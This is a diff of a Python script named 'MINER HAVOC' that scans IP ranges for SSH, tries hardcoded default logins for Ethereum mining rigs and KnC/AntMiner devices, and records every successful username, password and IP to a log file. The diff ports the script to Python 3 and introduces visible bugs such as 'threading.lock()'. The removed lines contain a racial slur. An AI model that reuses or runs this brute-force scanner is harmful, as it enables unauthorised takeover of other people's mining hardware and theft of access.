@@ -12,8 +12,7 @@ import os
 
 
 if len(sys.argv) < 3:
-    print \
-"""
+    print ("""
 
 XXXXXXXXXXXXXXXXXXFEDERAL RESERVE NOTEXXXXXXXXXXXXXXXXXXX
 XXX  XX       THE UNITED STATES OF AMERICA        XXX  XX
@@ -32,12 +31,12 @@ XX XXX            ___  MINER HAVOC  i              XXX XX
 XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
 
               
-              ~> By Souhardya Sardar 
+            ~> By Souhardya Sardar & Nexus 
              [+] github.com/Souhardya [+]
 
 
-"""
-    print "Usage: python "+sys.argv[0]+" [Start IP] [End IP] [etherum/misc]"
+""")
+    print("Usage: python "+sys.argv[0]+" [Start IP] [End IP] [etherum/misc]")
     
 
 if not os.geteuid()==0:
@@ -50,11 +49,11 @@ os.system("sysctl -w fs.file-max=999999 >/dev/null")
 
 
 if sys.argv[3] == 'etherum':
-    passwords = [ "ethos:live", "root:live" ] # etherum os default ssh credentials 
+    combos = [ "ethos:live", "root:live" ] # etherum os default ssh credentials 
 if sys.argv[3] == 'misc':
-    passwords = [ "root:admin", "admin:admin" ] # KnC Miner and AntMiner default creds etc
+    combos = [ "root:admin", "admin:admin" ] # KnC Miner and AntMiner default creds etc
 
-
+print_lock = threading.lock()
 
 def ipRange(start_ip, end_ip):
     start = list(map(int, start_ip.split(".")))
@@ -81,53 +80,50 @@ class sshscanner(threading.Thread): # TAG: 1A
         x = 1
         while x != 0:
             try:
-                username='root'
-                password="0"
-                port = 22
+                username, password = 'root', 'root'
+		
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.settimeout(3)
-                s.connect((self.ip, port))
+                s.connect((self.ip, 22))
                 s.close()
+		
                 ssh = paramiko.SSHClient()
                 ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+		
                 dobreak=False
-                for passwd in passwords:
-                    if ":n/a" in passwd:
-                        password=""
-                    else:
-                        password=passwd.split(":")[1]
-                    if "n/a:" in passwd:
-                        username=""
-                    else:
-                        username=passwd.split(":")[0]
+                for combo in combos:
+		    username, password = combo.split(':')
+		    username = '' if username.lower() == 'n/a' else username
+		    password = '' if password.lower() == 'n/a' else password
                     try:
-                        ssh.connect(self.ip, port = port, username=username, password=password, timeout=5)
+                        ssh.connect(self.ip, port = 22, username=username, password=password, timeout=5)
                         dobreak=True
                         break
                     except:
                         pass
-                    if True == dobreak:
-                        break
-                badserver=True
+                    if dobreak: break
+				
                 stdin, stdout, stderr = ssh.exec_command("echo hellonofucksgiven")
                 output = stdout.read()
-                if "nigger" in output:
-                    badserver=False 
-                if badserver == False:
+                if "hellonofucksgiven" in output:
                     os.system("echo -e " +self.ip+ " >> .stats.ips")
                     os.system("echo -e " +username+ ":" +password+ ":" +self.ip+ " >> gathered.log")
-                    print "\033[32mGathering -> " +username+ ":" +password+ ":" +self.ip+ "\033[0m"
-                    ssh.exec_command("echo niggered")
-                    time.sleep(3)
-                    ssh.close()
-                if badserver == True:
-                    ssh.close()
+                    print("\033[32mGathering -> " +username+ ":" +password+ ":" +self.ip+ "\033[0m")
+                    ssh.exec_command("echo hellothere:)")
+                else:
+		    pass
+	
+	        time.sleep(3)
+                ssh.close()
             except:
                 pass
             x = 0
-ip_range = ipRange("" +sys.argv[1], "" +sys.argv[2])
-for ip in ip_range:
-    try:                
+
+for ip in ipRange("" +sys.argv[1], "" +sys.argv[2]):
+    try:    
+	with print_lock:
+            print(f'[ ~ ] Loading --> {str(ip)} <3')
+	
         t = sshscanner(ip)
         t.start()
     except:
